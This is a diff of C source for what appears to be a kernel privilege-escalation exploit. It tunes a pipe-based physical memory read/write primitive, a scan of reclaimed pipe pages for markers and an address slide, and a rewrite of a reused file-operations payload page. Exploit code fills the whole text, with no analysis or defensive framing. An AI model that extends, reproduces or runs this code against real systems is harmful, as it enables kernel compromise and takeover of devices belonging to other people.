@@ -59,6 +59,7 @@ uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
 uintptr_t pipebuf_page_base;
 uintptr_t pipebuf_addr;
 int pipebuf_pipe_idx = -1;
+int p0_pipe_scan_changed_pages = -1;
 char physrw_readback[64];
 char physrw_after_write[64];
 int physrw_read_ok;
@@ -579,8 +580,8 @@ int pipe_phys_read(
   if (patch != (ssize_t)sizeof(pb)) {
     int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                   (ssize_t)sizeof(saved);
-    pr_error("pipe read buffer patch failed ret=%zd restore=%d\n",
-             patch, restore);
+    pr_warning("pipe read buffer patch failed ret=%zd restore=%d\n",
+               patch, restore);
     return 0;
   }
 
@@ -593,8 +594,8 @@ int pipe_phys_read(
       memcmp(&restored, &saved, sizeof(saved)) == 0;
   int ok = got == (ssize_t)len && restored_ok;
   if (!ok) {
-    pr_error("pipe read failed got=%zd want=%zu restore=%d\n",
-             got, len, restored_ok);
+    pr_warning("pipe read failed got=%zd want=%zu restore=%d\n",
+               got, len, restored_ok);
   }
   return ok;
 }
@@ -628,8 +629,8 @@ int pipe_phys_write(
   if (patch != (ssize_t)sizeof(pb)) {
     int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                   (ssize_t)sizeof(saved);
-    pr_error("pipe write buffer patch failed ret=%zd restore=%d\n",
-             patch, restore);
+    pr_warning("pipe write buffer patch failed ret=%zd restore=%d\n",
+               patch, restore);
     return 0;
   }
 
@@ -642,8 +643,8 @@ int pipe_phys_write(
       memcmp(&restored, &saved, sizeof(saved)) == 0;
   int ok = wrote == (ssize_t)len && restored_ok;
   if (!ok) {
-    pr_error("pipe write failed wrote=%zd want=%zu restore=%d\n",
-             wrote, len, restored_ok);
+    pr_warning("pipe write failed wrote=%zd want=%zu restore=%d\n",
+               wrote, len, restored_ok);
   }
   return ok;
 }
@@ -777,15 +778,15 @@ int install_pipe_physrw(int fd) {
   char seed[] = PHYS_READ_TAG;
   if (kernel_read_data(fd, proof_addr, saved_proof, sizeof(saved_proof)) !=
       (ssize_t)sizeof(saved_proof)) {
-    pr_error("phys proof old read failed addr=%016zx size=%zu\n",
-             proof_addr, sizeof(saved_proof));
+    pr_warning("phys proof old read failed addr=%016zx size=%zu\n",
+               proof_addr, sizeof(saved_proof));
     goto cleanup;
   }
   proof_saved = 1;
   if (kernel_read_data(fd, proof64_addr, &saved_proof64,
                        sizeof(saved_proof64)) !=
       (ssize_t)sizeof(saved_proof64)) {
-    pr_error("phys proof64 old read failed addr=%016zx\n", proof64_addr);
+    pr_warning("phys proof64 old read failed addr=%016zx\n", proof64_addr);
     goto cleanup;
   }
   proof64_saved = 1;
@@ -1087,6 +1088,20 @@ int expand_p0_pipe_oracle(void) {
   return 1;
 }
 
+static int p0_pipe_marker_matches(const unsigned char *page, size_t size) {
+  static const char prefix[] = "RMG-P0-PIPE";
+  if (size < sizeof(prefix) - 1 ||
+      memcmp(page, prefix, sizeof(prefix) - 1) != 0) {
+    return 0;
+  }
+  for (size_t offset = sizeof(prefix) - 1; offset < size; offset++) {
+    if (page[offset] != 0x5a) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
 int verify_p0_pipe_oracle_gate(void) {
   unsigned char page[PAGE_SIZE];
   int gate_hits = 0;
@@ -1101,12 +1116,12 @@ int verify_p0_pipe_oracle_gate(void) {
       pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                  pipe_index, errno);
       spawn_p0_ref_keeper(-1);
-      return 0;
+      return -1;
     }
     if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                         sizeof(page))) {
       spawn_p0_ref_keeper(-1);
-      return 0;
+      return -1;
     }
     size_t gate_offset = PAGE_SIZE;
     for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
@@ -1120,7 +1135,7 @@ int verify_p0_pipe_oracle_gate(void) {
       gate_pipe_index = (int)pipe_index;
       pr_info("p0 gate marker pipe=%zu offset=%zu\n",
               pipe_index, gate_offset);
-    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
+    } else if (!p0_pipe_marker_matches(page, sizeof(page))) {
       changed_pages++;
       uint64_t words[8];
       memcpy(words, page, sizeof(words));
@@ -1146,20 +1161,21 @@ int verify_p0_pipe_oracle_gate(void) {
     if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                          sizeof(marker))) {
       spawn_p0_ref_keeper(-1);
-      return 0;
+      return -1;
     }
   }
   pr_info("p0 pipe gate hits=%d changed=%d\n",
           gate_hits, changed_pages);
 #if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
     APP_FOPS_REWRITE_RECLAIMED_PAGE
-  if (gate_hits == 1 && changed_pages == 0) {
+  if (gate_hits == 1 && changed_pages == 0 &&
+      app_fops_page_reuse_enabled()) {
     unsigned char merge_seed[APP_REUSED_FOPS_PAGE_PRESERVE];
     memset(merge_seed, 0xa5, sizeof(merge_seed));
     if (!pipe_write_full(pipe_fds_reclaim[gate_pipe_index][1],
                          merge_seed, sizeof(merge_seed))) {
-      pr_error("p0 payload rewrite seed failed pipe=%d errno=%d\n",
-               gate_pipe_index, errno);
+      pr_warning("p0 payload rewrite seed failed pipe=%d errno=%d\n",
+                 gate_pipe_index, errno);
       spawn_p0_ref_keeper(-1);
       return -1;
     }
@@ -1197,8 +1213,8 @@ int rewrite_p0_payload_page(const void *data, size_t size) {
   if (!pipe_write_full(pipe_fds_reclaim[p0_rewrite_pipe_index][1],
                        bytes + APP_REUSED_FOPS_PAGE_PRESERVE,
                        size - APP_REUSED_FOPS_PAGE_PRESERVE)) {
-    pr_error("p0 payload rewrite write failed pipe=%d errno=%d\n",
-             p0_rewrite_pipe_index, errno);
+    pr_warning("p0 payload rewrite write failed pipe=%d errno=%d\n",
+               p0_rewrite_pipe_index, errno);
     return 0;
   }
 
@@ -1314,19 +1330,50 @@ uintptr_t scan_p0_pipe_oracle(void) {
   int best_score = -1;
   int second_score = -1;
   int changed_pages = 0;
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+  int scan_holder[2] = {-1, -1};
+#endif
+  p0_pipe_scan_changed_pages = -1;
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+  if (pipe2(scan_holder, O_CLOEXEC) != 0 ||
+      fcntl(scan_holder[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+    pr_warning("p0 scan holder setup failed errno=%d\n", errno);
+    if (scan_holder[0] >= 0) close(scan_holder[0]);
+    if (scan_holder[1] >= 0) close(scan_holder[1]);
+    return (uintptr_t)-1;
+  }
+#endif
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   int best_significant = 0;
 #endif
 
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     memset(page, 0, sizeof(page));
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+    errno = 0;
+    ssize_t duplicated = syscall(
+        SYS_tee, pipe_fds_reclaim[pipe_index][0], scan_holder[1],
+        scan_size, SPLICE_F_NONBLOCK);
+    if (duplicated != (ssize_t)scan_size ||
+        !pipe_read_full(scan_holder[0], page, scan_size)) {
+      pr_warning("p0 scan snapshot failed pipe=%zu tee=%zd size=%zu errno=%d\n",
+                 pipe_index, duplicated, scan_size, errno);
+      close(scan_holder[0]);
+      close(scan_holder[1]);
+      return (uintptr_t)-1;
+    }
+#else
     if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                         scan_size)) {
       pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                  pipe_index, scan_size, errno);
       return (uintptr_t)-1;
     }
-    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+#endif
+    if (p0_pipe_marker_matches(page, scan_size)) {
       continue;
     }
 
@@ -1372,6 +1419,13 @@ uintptr_t scan_p0_pipe_oracle(void) {
             pipe_index, best_score, second_score, best_slide);
 #endif
   }
+
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+  close(scan_holder[0]);
+  close(scan_holder[1]);
+#endif
+  p0_pipe_scan_changed_pages = changed_pages;
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   pr_info("p0 fingerprint changed=%d best=%d second=%d "
